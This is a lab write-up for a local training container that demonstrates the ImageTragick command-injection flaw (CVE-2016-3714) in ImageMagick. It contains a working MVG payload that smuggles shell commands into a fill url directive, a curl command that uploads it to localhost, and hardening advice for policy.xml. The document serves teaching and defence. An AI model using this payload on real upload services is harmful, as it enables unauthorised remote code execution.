# ImageMagick Delegate Injection RCE ("ImageTragick" CVE-2016-3714)

## Overview

ImageTragick (CVE-2016-3714) is an infamous remote code execution vulnerability in the ImageMagick image manipulation library (versions prior to 6.9.3-10 and 7.0.1-1). ImageMagick is integrated across millions of web applications, photo sharing sites, and CMS platforms to process profile pictures, generate thumbnails, and convert image formats.

The flaw exists within ImageMagick's delegate configuration system (`delegates.xml`). When processing certain vector and scripting formats (such as Magick Vector Graphics `.mvg`, SVG, or HTTPS URLs), ImageMagick delegates processing to external system commands (such as `wget` or `curl`) using shell interpolation without sanitizing the filename. By crafting a pseudo-image containing shell metacharacters inside the `fill 'url(https://...)'` directive, an attacker triggers arbitrary operating system commands when the application attempts to process or resize the uploaded image.

- **Primary Interface**: `http://localhost:8133`
- **Docker Shortcut**: `./lab start imagetragick`
- **Container Name**: `cyberlab_02_imagetragick_rce`
- **RAM Footprint**: ~100 MB (Apache + PHP + ImageMagick 6.9.2-10)

---

## Exploitation Walkthrough

### 1. Crafting the Malicious Image Payload
Create a file named `exploit.mvg` (or disguised as `exploit.jpg` or `exploit.png`):

```text
push graphic-context
viewbox 0 0 640 480
fill 'url(https://example.com/image.jpg";id;touch /tmp/pwned")'
pop graphic-context
```

### 2. Uploading the Payload via Web Form / Curl
Upload the crafted payload to the target web interface:

```bash
curl -F "file_upload=@exploit.mvg;type=image/png" \
  http://localhost:8133/
```

### 3. Verifying Command Execution Inside Container
```bash
docker exec -it cyberlab_02_imagetragick_rce ls -la /tmp/pwned
```

The file `/tmp/pwned` exists and is owned by `www-data`, confirming successful execution.

---

## Defensive Remediation & Hardening

1. **Policy File Hardening (`policy.xml`)**:
   Disable vulnerable coder delegates in `/etc/ImageMagick/policy.xml`:
   ```xml
   <policymap>
     <policy domain="coder" rights="none" pattern="EPHEMERAL" />
     <policy domain="coder" rights="none" pattern="URL" />
     <policy domain="coder" rights="none" pattern="HTTPS" />
     <policy domain="coder" rights="none" pattern="MVG" />
     <policy domain="coder" rights="none" pattern="MSL" />
     <policy domain="coder" rights="none" pattern="TEXT" />
   </policymap>
   ```
2. **Validate Magic Bytes**:
   Verify file header magic bytes prior to passing uploaded data into ImageMagick processing pipelines.

---

## Video Walkthroughs & Technical References

- [HackTheBox - Ariekei](https://www.youtube.com/watch?v=Pc4tzsn-ats)
- [ImageTragick Advisory](https://imagetragick.com/)
- [Vulhub ImageMagick CVE-2016-3714 Advisory](https://vulhub.org/#/environments/imagemagick/CVE-2016-3714/)
